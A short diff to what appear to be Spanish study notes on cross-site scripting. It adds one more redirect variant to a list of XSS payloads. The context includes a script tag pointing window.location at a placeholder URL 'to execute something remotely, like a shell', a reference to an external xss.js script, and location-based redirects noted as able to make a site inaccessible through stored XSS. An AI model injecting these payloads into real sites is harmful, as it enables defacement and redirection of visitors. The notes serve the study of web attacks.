@@ -186,6 +186,7 @@ http://xss.rocks/xss.js
         <script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
             window.location = "http://informatica.ucm.es"; Se puede usar para dejar inaccesible una web en caso de stored xss
             También document.location.href = "http://informatica.ucm.es";
+	    También document.location.href = "https://google.es";
             También location.assign("http://informatica.ucm.es");
             También location.replace("http://informatica.ucm.es");
 
